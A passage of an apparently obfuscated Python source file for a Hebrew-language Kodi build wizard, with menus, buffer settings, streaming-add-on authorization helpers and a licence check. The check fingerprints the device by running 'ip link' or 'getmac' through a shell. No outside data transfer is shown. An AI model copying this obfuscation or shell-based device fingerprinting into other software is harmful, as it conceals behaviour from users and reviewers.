							O00OO0O00O0OOO00O =O00OO0O00O0OOO00O [:O00OO0O00O0OOO00O .find ("/")]#line:1714
						elif O00OO0O00O0OOO00O .find (">")>0 :#line:1715
							O00OO0O00O0OOO00O =O00OO0O00O0OOO00O [:O00OO0O00O0OOO00O .find (">")]#line:1716
					OOO00O0OOOOOO00O0 .append (O00OO0O00O0OOO00O .strip ())#line:1718
			OOO000O00OO00OOOO =OOO00O0OOOOOO00O0 #line:1719
		else :#line:1720
			OOO00O0OOOOOO00O0 =[]#line:1721
			for OO000O00O0O00O000 in OOO000O00OO00OOOO :#line:1722
				OO0OOOO0OOO0OO0O0 =u"</"+name #line:1723
				O000O0OO0000OOOOO =O0O0O0O0OO0OO00O0 .find (OO000O00O0O00O000 )#line:1725
				O00O00O0OO0O0OOO0 =O0O0O0O0OO0OO00O0 .find (OO0OOOO0OOO0OO0O0 ,O000O0OO0000OOOOO )#line:1726
				O00OO0000OO0OOOOO =O0O0O0O0OO0OO00O0 .find ("<"+name ,O000O0OO0000OOOOO +1 )#line:1727
				while O00OO0000OO0OOOOO <O00O00O0OO0O0OOO0 and O00OO0000OO0OOOOO !=-1 :#line:1729
					OOOO0O0000O0O0OO0 =O0O0O0O0OO0OO00O0 .find (OO0OOOO0OOO0OO0O0 ,O00O00O0OO0O0OOO0 +len (OO0OOOO0OOO0OO0O0 ))#line:1730
					if OOOO0O0000O0O0OO0 !=-1 :#line:1731
						O00O00O0OO0O0OOO0 =OOOO0O0000O0O0OO0 #line:1732
					O00OO0000OO0OOOOO =O0O0O0O0OO0OO00O0 .find ("<"+name ,O00OO0000OO0OOOOO +1 )#line:1733
				if O000O0OO0000OOOOO ==-1 and O00O00O0OO0O0OOO0 ==-1 :#line:1735
					OOOO0O00OOO0OOO00 =u""#line:1736
				elif O000O0OO0000OOOOO >-1 and O00O00O0OO0O0OOO0 >-1 :#line:1737
					OOOO0O00OOO0OOO00 =O0O0O0O0OO0OO00O0 [O000O0OO0000OOOOO +len (OO000O00O0O00O000 ):O00O00O0OO0O0OOO0 ]#line:1738
				elif O00O00O0OO0O0OOO0 >-1 :#line:1739
					OOOO0O00OOO0OOO00 =O0O0O0O0OO0OO00O0 [:O00O00O0OO0O0OOO0 ]#line:1740
				elif O000O0OO0000OOOOO >-1 :#line:1741
					OOOO0O00OOO0OOO00 =O0O0O0O0OO0OO00O0 [O000O0OO0000OOOOO +len (OO000O00O0O00O000 ):]#line:1742
				if ret :#line:1744
					OO0OOOO0OOO0OO0O0 =O0O0O0O0OO0OO00O0 [O00O00O0OO0O0OOO0 :O0O0O0O0OO0OO00O0 .find (">",O0O0O0O0OO0OO00O0 .find (OO0OOOO0OOO0OO0O0 ))+1 ]#line:1745
					OOOO0O00OOO0OOO00 =OO000O00O0O00O000 +OOOO0O00OOO0OOO00 +OO0OOOO0OOO0OO0O0 #line:1746
				O0O0O0O0OO0OO00O0 =O0O0O0O0OO0OO00O0 [O0O0O0O0OO0OO00O0 .find (OOOO0O00OOO0OOO00 ,O0O0O0O0OO0OO00O0 .find (OO000O00O0O00O000 ))+len (OOOO0O00OOO0OOO00 ):]#line:1748
				OOO00O0OOOOOO00O0 .append (OOOO0O00OOO0OOO00 )#line:1749
			OOO000O00OO00OOOO =OOO00O0OOOOOO00O0 #line:1750
		OOO0000OO00O0O000 +=OOO000O00OO00OOOO #line:1751
	return OOO0000OO00O0O000 #line:1753
def addItem (OO0OO00OOO0OOO0O0 ,O0000OOO000O0OO0O ,OO00000000O00O0O0 ,OOO0O0O00000OO0O0 ,O0OO000000O000O00 ,description =None ):#line:1755
	if description ==None :description =''#line:1756
	description ='[COLOR white]'+description +'[/COLOR]'#line:1757
	OOO0O0OO000OOO00O =sys .argv [0 ]+"?url="+urllib .quote_plus (O0000OOO000O0OO0O )+"&mode="+str (OO00000000O00O0O0 )+"&name="+urllib .quote_plus (OO0OO00OOO0OOO0O0 )+"&iconimage="+urllib .quote_plus (OOO0O0O00000OO0O0 )+"&fanart="+urllib .quote_plus (O0OO000000O000O00 )#line:1758
	O0OO0OO0OOOO0OO0O =True #line:1759
	OOOO0O00OOO00O000 =xbmcgui .ListItem (OO0OO00OOO0OOO0O0 ,iconImage =OOO0O0O00000OO0O0 ,thumbnailImage =OOO0O0O00000OO0O0 )#line:1760
	OOOO0O00OOO00O000 .setInfo (type ="Video",infoLabels ={"Title":OO0OO00OOO0OOO0O0 ,"Plot":description })#line:1761
	OOOO0O00OOO00O000 .setProperty ("fanart_Image",O0OO000000O000O00 )#line:1762
	OOOO0O00OOO00O000 .setProperty ("icon_Image",OOO0O0O00000OO0O0 )#line:1763
	O0OO0OO0OOOO0OO0O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO0O0OO000OOO00O ,listitem =OOOO0O00OOO00O000 ,isFolder =False )#line:1764
	return O0OO0OO0OOOO0OO0O #line:1765
def get_params ():#line:1767
		O00OOOOO00OOO0O0O =[]#line:1768
		O0O0O0000O0OO000O =sys .argv [2 ]#line:1769
		if len (O0O0O0000O0OO000O )>=2 :#line:1770
				OO00O00OO00O0O0OO =sys .argv [2 ]#line:1771
				O00OOO00000000OO0 =OO00O00OO00O0O0OO .replace ('?','')#line:1772
				if (OO00O00OO00O0O0OO [len (OO00O00OO00O0O0OO )-1 ]=='/'):#line:1773
						OO00O00OO00O0O0OO =OO00O00OO00O0O0OO [0 :len (OO00O00OO00O0O0OO )-2 ]#line:1774
				O00O000O00000O0O0 =O00OOO00000000OO0 .split ('&')#line:1775
				O00OOOOO00OOO0O0O ={}#line:1776
				for OOOO0OO0O0OO00000 in range (len (O00O000O00000O0O0 )):#line:1777
						OOO00000000O0O00O ={}#line:1778
						OOO00000000O0O00O =O00O000O00000O0O0 [OOOO0OO0O0OO00000 ].split ('=')#line:1779
						if (len (OOO00000000O0O00O ))==2 :#line:1780
								O00OOOOO00OOO0O0O [OOO00000000O0O00O [0 ]]=OOO00000000O0O00O [1 ]#line:1781
		return O00OOOOO00OOO0O0O #line:1783
def decode (OO0000O0OO0O0O0O0 ,OO0OOO000O0O00OOO ):#line:1788
    import base64 #line:1789
    O0000O0O000000OOO =[]#line:1790
    if (len (OO0000O0OO0O0O0O0 ))!=4 :#line:1792
     return 10 #line:1793
    OO0OOO000O0O00OOO =base64 .urlsafe_b64decode (OO0OOO000O0O00OOO )#line:1794
    for OOOO0OOOOOO0OO0O0 in range (len (OO0OOO000O0O00OOO )):#line:1796
        O0OO00O00OO0OOO00 =OO0000O0OO0O0O0O0 [OOOO0OOOOOO0OO0O0 %len (OO0000O0OO0O0O0O0 )]#line:1797
        O000O00000O00OOO0 =chr ((256 +ord (OO0OOO000O0O00OOO [OOOO0OOOOOO0OO0O0 ])-ord (O0OO00O00OO0OOO00 ))%256 )#line:1798
        O0000O0O000000OOO .append (O000O00000O00OOO0 )#line:1799
    return "".join (O0000O0O000000OOO )#line:1800
def tmdb_list (O0OOO00OO00O0OO00 ):#line:1801
    O0000O0OO0O00O000 =decode ("7643",O0OOO00OO00O0OO00 )#line:1804
    return int (O0000O0OO0O00O000 )#line:1807
def u_list (O00OO0OOO0OO00OO0 ):#line:1808
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:1810
        from math import sqrt #line:1811
        OO0000OO000O0OOOO =tmdb_list (TMDB_NEW_API )#line:1812
        OO0O00O0O00OOOO00 =str ((getHwAddr ('eth0'))*OO0000OO000O0OOOO )#line:1814
        OO0OOOOO0O0OO000O =int (OO0O00O0O00OOOO00 [1 ]+OO0O00O0O00OOOO00 [2 ]+OO0O00O0O00OOOO00 [5 ]+OO0O00O0O00OOOO00 [7 ])#line:1815
        OO0O0O00O00000OO0 =(ADDON .getSetting ("pass"))#line:1817
        OO00O0O00O00OO000 =(str (round (sqrt ((OO0OOOOO0O0OO000O *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1822
        if '.'in OO00O0O00O00OO000 :#line:1824
         OO00O0O00O00OO000 =(str (round (sqrt ((OO0OOOOO0O0OO000O *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1825
        if OO0O0O00O00000OO0 ==OO00O0O00O00OO000 :#line:1827
          OOO00O0OOO000O0O0 =O00OO0OOO0OO00OO0 #line:1829
        else :#line:1831
           if STARTP2 ()and STARTP ()=='ok':#line:1832
             return O00OO0OOO0OO00OO0 #line:1835
           OOO00O0OOO000O0O0 ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1836
           xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1837
           sys .exit ()#line:1838
        return OOO00O0OOO000O0O0 #line:1839
    else :#line:1840
        STARTP ()#line:1841
def disply_hwr ():#line:1845
   try :#line:1846
    OO0000O0O00OO00O0 =tmdb_list (TMDB_NEW_API )#line:1847
    O0OOOO00OOOOOOO0O =str ((getHwAddr ('eth0'))*OO0000O0O00OO00O0 )#line:1848
    OOO0OOOOOOOOOOOOO =(O0OOOO00OOOOOOO0O [1 ]+O0OOOO00OOOOOOO0O [2 ]+O0OOOO00OOOOOOO0O [5 ]+O0OOOO00OOOOOOO0O [7 ])#line:1855
    O0O000OO00OOO00OO =(ADDON .getSetting ("action"))#line:1856
    wiz .setS ('action',str (OOO0OOOOOOOOOOOOO ))#line:1858
   except :pass #line:1859
def disply_hwr2 ():#line:1860
   try :#line:1861
    OOOOO00O00OO0O000 =tmdb_list (TMDB_NEW_API )#line:1862
    O00000OO0O00O000O =str ((getHwAddr ('eth0'))*OOOOO00O00OO0O000 )#line:1864
    O0O0OOOO0O00O00O0 =(O00000OO0O00O000O [1 ]+O00000OO0O00O000O [2 ]+O00000OO0O00O000O [5 ]+O00000OO0O00O000O [7 ])#line:1873
    OOO00000OO0000OO0 =(ADDON .getSetting ("action"))#line:1874
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O0O0OOOO0O00O00O0 )#line:1877
   except :pass #line:1878
def getHwAddr (OO00000OOO0OOO0O0 ):#line:1880
   import subprocess ,time #line:1881
   O0O0OOO0OO000O0O0 ='windows'#line:1882
   if xbmc .getCondVisibility ('system.platform.android'):#line:1883
       O0O0OOO0OO000O0O0 ='android'#line:1884
   if xbmc .getCondVisibility ('system.platform.android'):#line:1885
     OOO00O000O000O000 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1886
     O000OO0OOO000OOOO =re .compile ('link/ether (.+?) brd').findall (str (OOO00O000O000O000 ))#line:1888
     OOOOO0O00OO0OOO0O =0 #line:1889
     for OO00O0O0OOOOOO000 in O000OO0OOO000OOOO :#line:1890
      if O000OO0OOO000OOOO !='00:00:00:00:00:00':#line:1891
          OO000O0000O000000 =OO00O0O0OOOOOO000 #line:1892
          OOOOO0O00OO0OOO0O =OOOOO0O00OO0OOO0O +int (OO000O0000O000000 .replace (':',''),16 )#line:1893
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1895
       OOO00OO0O00OOOO0O =0 #line:1896
       OOOOO0O00OO0OOO0O =0 #line:1897
       OOOO0OO0OOOO00O00 =[]#line:1898
       OO0OOOOO0O0OOO0O0 =os .popen ("getmac").read ()#line:1899
       OO0OOOOO0O0OOO0O0 =OO0OOOOO0O0OOO0O0 .split ("\n")#line:1900
       for OOO00000000OOOO00 in OO0OOOOO0O0OOO0O0 :#line:1902
            OO0OOO00000OO0OOO =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO00000000OOOO00 ,re .I )#line:1903
            if OO0OOO00000OO0OOO :#line:1904
                O000OO0OOO000OOOO =OO0OOO00000OO0OOO .group ().replace ('-',':')#line:1905
                OOOO0OO0OOOO00O00 .append (O000OO0OOO000OOOO )#line:1906
                OOOOO0O00OO0OOO0O =OOOOO0O00OO0OOO0O +int (O000OO0OOO000OOOO .replace (':',''),16 )#line:1909
   else :#line:1911
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1912
   try :#line:1929
    return OOOOO0O00OO0OOO0O #line:1930
   except :pass #line:1931
def getpass ():#line:1932
	disply_hwr2 ()#line:1934
def setpass ():#line:1935
    OOO0O00O0O000O0OO =xbmcgui .Dialog ()#line:1936
    OO0000O0OO0OO0000 =''#line:1937
    O000OOOOOO0000OOO =xbmc .Keyboard (OO0000O0OO0OO0000 ,'הכנס סיסמה')#line:1939
    O000OOOOOO0000OOO .doModal ()#line:1940
    if O000OOOOOO0000OOO .isConfirmed ():#line:1941
           O000OOOOOO0000OOO =O000OOOOOO0000OOO .getText ()#line:1942
    wiz .setS ('pass',str (O000OOOOOO0000OOO ))#line:1943
def setuname ():#line:1944
    O000OO0O0OO00O000 =''#line:1945
    OOO0000OOO0OO0000 =xbmc .Keyboard (O000OO0O0OO00O000 ,'הכנס שם משתמש')#line:1946
    OOO0000OOO0OO0000 .doModal ()#line:1947
    if OOO0000OOO0OO0000 .isConfirmed ():#line:1948
           O000OO0O0OO00O000 =OOO0000OOO0OO0000 .getText ()#line:1949
           wiz .setS ('user',str (O000OO0O0OO00O000 ))#line:1950
def powerkodi ():#line:1951
    os ._exit (1 )#line:1952
def buffer1 ():#line:1954
	OOOO0000O000O00OO =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1955
	O000O0OOOO00OOO0O =xbmc .getInfoLabel ("System.Memory(total)")#line:1956
	O00O00O0O00OO00OO =xbmc .getInfoLabel ("System.FreeMemory")#line:1957
	O000OO0O0O000O00O =re .sub ('[^0-9]','',O00O00O0O00OO00OO )#line:1958
	O000OO0O0O000O00O =int (O000OO0O0O000O00O )/3 #line:1959
	OO000000OO00OOOO0 =O000OO0O0O000O00O *1024 *1024 #line:1960
	try :OO00O0O00O0OO0O0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1961
	except :OO00O0O00O0OO0O0O =16 #line:1962
	O00O0OO0000000OO0 =DIALOG .yesno ('FREE MEMORY: '+str (O00O00O0O00OO00OO ),'Based on your free Memory your optimal buffersize is: '+str (O000OO0O0O000O00O )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1965
	if O00O0OO0000000OO0 ==1 :#line:1966
		with open (OOOO0000O000O00OO ,"w")as O0O000OO0OOO00O0O :#line:1967
			if OO00O0O00O0OO0O0O >=17 :O0OOOO0OOOO0OOO0O =xml_data_advSettings_New (str (OO000000OO00OOOO0 ))#line:1968
			else :O0OOOO0OOOO0OOO0O =xml_data_advSettings_old (str (OO000000OO00OOOO0 ))#line:1969
			O0O000OO0OOO00O0O .write (O0OOOO0OOOO0OOO0O )#line:1971
			DIALOG .ok ('Buffer Size Set to: '+str (OO000000OO00OOOO0 ),'Please restart Kodi for settings to apply.','')#line:1972
	elif O00O0OO0000000OO0 ==0 :#line:1974
		OO000000OO00OOOO0 =_OOO0000OO00O0OOOO (default =str (OO000000OO00OOOO0 ),heading ="INPUT BUFFER SIZE")#line:1975
		with open (OOOO0000O000O00OO ,"w")as O0O000OO0OOO00O0O :#line:1976
			if OO00O0O00O0OO0O0O >=17 :O0OOOO0OOOO0OOO0O =xml_data_advSettings_New (str (OO000000OO00OOOO0 ))#line:1977
			else :O0OOOO0OOOO0OOO0O =xml_data_advSettings_old (str (OO000000OO00OOOO0 ))#line:1978
			O0O000OO0OOO00O0O .write (O0OOOO0OOOO0OOO0O )#line:1979
			DIALOG .ok ('Buffer Size Set to: '+str (OO000000OO00OOOO0 ),'Please restart Kodi for settings to apply.','')#line:1980
def xml_data_advSettings_old (OOOOOO00OO0OOO00O ):#line:1981
	O000000O00OO0OOO0 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%OOOOOO00OO0OOO00O #line:1991
	return O000000O00OO0OOO0 #line:1992
def xml_data_advSettings_New (OO00OO00OOO00OO00 ):#line:1994
	O0O0OO000OO000OOO ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%OO00OO00OOO00OO00 #line:2006
	return O0O0OO000OO000OOO #line:2007
def write_ADV_SETTINGS_XML (O000OO00OOOO00OO0 ):#line:2008
    if not os .path .exists (xml_file ):#line:2009
        with open (xml_file ,"w")as O000OOO0O000OO0OO :#line:2010
            O000OOO0O000OO0OO .write (xml_data )#line:2011
def _OOO0000OO00O0OOOO (default ="",heading ="",hidden =False ):#line:2012
    ""#line:2013
    OO0000OOOOO0O0OO0 =xbmc .Keyboard (default ,heading ,hidden )#line:2014
    OO0000OOOOO0O0OO0 .doModal ()#line:2015
    if (OO0000OOOOO0O0OO0 .isConfirmed ()):#line:2016
        return unicode (OO0000OOOOO0O0OO0 .getText (),"utf-8")#line:2017
    return default #line:2018
def index ():#line:2020
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2021
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2022
	if AUTOUPDATE =='Yes':#line:2023
		if wiz .workingURL (WIZARDFILE )==True :#line:2024
			O0O000O0O00O00O0O =wiz .checkWizard ('version')#line:2025
			if O0O000O0O00O00O0O >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0O000O0O00O00O0O ),'wizardupdate',themeit =THEME2 )#line:2026
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2027
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2028
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2029
	if len (BUILDNAME )>0 :#line:2030
		OOOO0O000000000O0 =wiz .checkBuild (BUILDNAME ,'version')#line:2031
		O0OOOO0O000OO00OO ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2032
		if OOOO0O000000000O0 >BUILDVERSION :O0OOOO0O000OO00OO ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0OOOO0O000OO00OO ,OOOO0O000000000O0 )#line:2033
		addDir (O0OOOO0O000OO00OO ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2035
		try :#line:2037
		     O0OO0O00OO0OO00OO =wiz .themeCount (BUILDNAME )#line:2038
		except :#line:2039
		   O0OO0O00OO0OO00OO =False #line:2040
		if not O0OO0O00OO0OO00OO ==False :#line:2041
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2042
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2043
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2046
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2047
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2048
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2052
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2054
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2056
def morsetup ():#line:2058
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2059
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2060
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2061
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2062
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2067
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2068
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2071
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2072
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2082
	setView ('files','viewType')#line:2083
def morsetup2 ():#line:2084
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2085
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2086
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2087
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2088
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2089
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2090
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2091
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2092
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2093
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2094
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2095
def fastupdate ():#line:2096
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2097
def forcefastupdate ():#line:2099
			OOO0000000O0O0O0O ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2100
			wiz .ForceFastUpDate (ADDONTITLE ,OOO0000000O0O0O0O )#line:2101
def rdsetup ():#line:2105
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2106
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2107
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2109
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2110
def traktsetup ():#line:2113
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2114
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2115
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2116
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2117
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2118
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2119
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2120
	setView ('files','viewType')#line:2121
def setautorealdebrid ():#line:2122
    from resources .libs import real_debrid #line:2123
    OO000O00OOO0O0OO0 =real_debrid .RealDebridFirst ()#line:2124
    OO000O00OOO0O0OO0 .auth ()#line:2125
def setrealdebrid ():#line:2127
    OOOOO0OO000OO0OOO =(ADDON .getSetting ("auto_rd"))#line:2128
    if OOOOO0OO000OO0OOO =='false':#line:2129
       ADDON .openSettings ()#line:2130
    else :#line:2131
        from resources .libs import real_debrid #line:2132
        OOO00OOOOO000O0OO =real_debrid .RealDebrid ()#line:2133
        OOO00OOOOO000O0OO .auth ()#line:2134
        rdon ()#line:2137
def resolveurlsetup ():#line:2139
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2140
def urlresolversetup ():#line:2141
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2142
def placentasetup ():#line:2144
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2145
def reptiliasetup ():#line:2146
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2147
def flixnetsetup ():#line:2148
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2149
def yodasetup ():#line:2150
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2151
def numberssetup ():#line:2152
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2153
def uranussetup ():#line:2154
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2155
def genesissetup ():#line:2156
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2157
def net_tools (view =None ):#line:2159
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2160
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2161
	setView ('files','viewType')#line:2163
def speedMenu ():#line:2164
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2165
def viewIP ():#line:2166
	O0O00O0OOO0O00O00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2180
	OO000OOO0OO000OO0 =[];OOOO0OOOO0OO0000O =0 #line:2181
	for OO0O0O0OO0OO00OO0 in O0O00O0OOO0O00O00 :#line:2182
		OO0OO0O00OOO00OOO =wiz .getInfo (OO0O0O0OO0OO00OO0 )#line:2183
		O0OOO0000OO000OO0 =0 #line:2184
		while OO0OO0O00OOO00OOO =="Busy"and O0OOO0000OO000OO0 <10 :#line:2185
			OO0OO0O00OOO00OOO =wiz .getInfo (OO0O0O0OO0OO00OO0 );O0OOO0000OO000OO0 +=1 ;wiz .log ("%s sleep %s"%(OO0O0O0OO0OO00OO0 ,str (O0OOO0000OO000OO0 )));xbmc .sleep (1000 )#line:2186
		OO000OOO0OO000OO0 .append (OO0OO0O00OOO00OOO )#line:2187
		OOOO0OOOO0OO0000O +=1 #line:2188
	O0OOO00O00O000O0O ,OO00O000O0OO0O000 ,OO000OOO0O00OOOO0 =getIP ()#line:2189
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OOO0OO000OO0 [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2190
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00O00O000O0O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2191
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O000O0OO0O000 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2192
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OOO0O00OOOO0 ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2193
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO000OOO0OO000OO0 [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2194
	setView ('files','viewType')#line:2195
def buildMenu ():#line:2197
	if USERNAME =='':#line:2198
		ADDON .openSettings ()#line:2199
		sys .exit ()#line:2200
	if PASSWORD =='':#line:2201
		ADDON .openSettings ()#line:2202
	OOO0OOOO0000O00O0 =u_list (SPEEDFILE )#line:2203
	(OOO0OOOO0000O00O0 )#line:2204
	OO0OOO000O000OOO0 =(wiz .workingURL (OOO0OOOO0000O00O0 ))#line:2205
	(OO0OOO000O000OOO0 )#line:2206
	OO0OOO000O000OOO0 =wiz .workingURL (SPEEDFILE )#line:2207
	if not OO0OOO000O000OOO0 ==True :#line:2208
		addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2209
